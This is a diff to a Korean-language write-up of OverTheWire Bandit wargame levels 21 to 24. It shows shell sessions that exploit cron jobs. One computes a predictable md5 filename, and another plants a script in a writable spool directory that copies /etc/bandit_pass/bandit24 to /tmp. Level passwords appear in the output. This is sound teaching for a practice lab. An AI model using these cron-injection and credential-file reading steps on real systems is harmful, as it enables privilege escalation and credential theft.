@@ -425,7 +425,7 @@ Password matches, sending next password
 ```
 
 5. (1번 터미널)다음 password를 확인한다
-``shell
+```shell
 bandit20@bandit:~$ nc -l 12345
 VxCazJaVykI6W36BkBU0mJTCM8rR95XT
 NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
@@ -437,5 +437,125 @@ NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
 ---
 
 ```shell
+bandit21@bandit:~$ ls /etc/cron.d
+cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
+cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
+bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+bandit21@bandit:~$ /usr/bin/cronjob_bandit22.sh
+chmod: changing permissions of '/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv': Operation not permitted
+/usr/bin/cronjob_bandit22.sh: line 3: /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv: Permission denied
+bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
+```
+# Level22 -> Level23
+---
 
+```shell
+bandit22@bandit:~$ ls /etc/cron.d
+cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
+cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
+bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+```
+
+# Level23 -> Level24
+---
+
+```shell
+bandit23@bandit:~$ ls /etc/cron.d
+cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
+cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ /usr/bin/cronjob_bandit24.sh
+/usr/bin/cronjob_bandit24.sh: line 5: cd: /var/spool/bandit23/foo: No such file or directory
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo || exit 1
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -rf ./$i
+    fi
+done
+```
+
+현재 `/usr/bin/cronjob_bandit24.sh` 스크립트가 cron에 의해 **매분**마다 bandit24 사용자 권한으로 실행된다.
+해당 스크립트의 동작을 정리하면 다음과 같다.
+
+1. `/var/spool/{현재 사용자 이름}/foo` 디렉터리로 이동한다.
+    - `whoami`는 현재 사용자 이름을 출력하는 명령
+2. 해당 디렉터리에서 `.`과 `..`을 제외한 모든 파일명에 대해 반복문을 수행한다.
+    - `for i in * .*`에서 `*`는 모든 파일, `.*`은 숨긴 모든 파일을 의미
+3. 반복문 내에서는 해당 파일명의 소유자가 "bandit23"과 같은지 확인한다
+    - `stat --format "%U" ./$i` : `./$i` 파일의 소유자를 출력
+4. bandit23과 같다면, 60초 이내에 해당 파일을 실행해야 한다.
+    - `timeout -s 9 60 ./$i`에서 `-s 9`는 강제 종료 신호인 9번 신호(SIGKILL)를 이용한다는 의미
+
+<br>
+
+```shell
+bandit23@bandit:~$ ls -al /var/spool/bandit24/
+total 12
+dr-xr-x--- 3 bandit24 bandit23 4096 Apr 23 18:04 .
+drwxr-xr-x 5 root     root     4096 Apr 23 18:04 ..
+drwxrwx-wx 3 root     bandit24 4096 Apr 24 15:22 foo
+```
+
+foo 디렉터리는 작성 권한이 있기 때문에 해당 디렉터리 내에 bandit24 password를 다른 파일로 출력할 수 있는 스크립트를 작성해야 한다.
+
+<br>
+
+```shell
+bandit23@bandit:~$ vim /var/spool/bandit24/foo/shell.sh
+```
+ vim을 통해 아래의 내용을 포함한 스크립트 파일을 만들자.
+
+```
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass
+```
+
+<br>
+
+파일 생성 후, bandit24 사용자가 해당 파일을 실행할 수 있도록 권한을 설정 해준다.
+
+```shell
+bandit23@bandit:~$ chmod 777 /var/spool/bandit24/foo/shell.sh
+```
+
+<br>
+
+cron이 `cronjob_bandit24.sh`를 실행할 때까지 잠시 기다린 후에, password를 복사한 파일을 읽으면 password를 획득할 수 있다.
+
+```shell
+bandit23@bandit:~$ cat /tmp/bandit24_pass
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
 ```
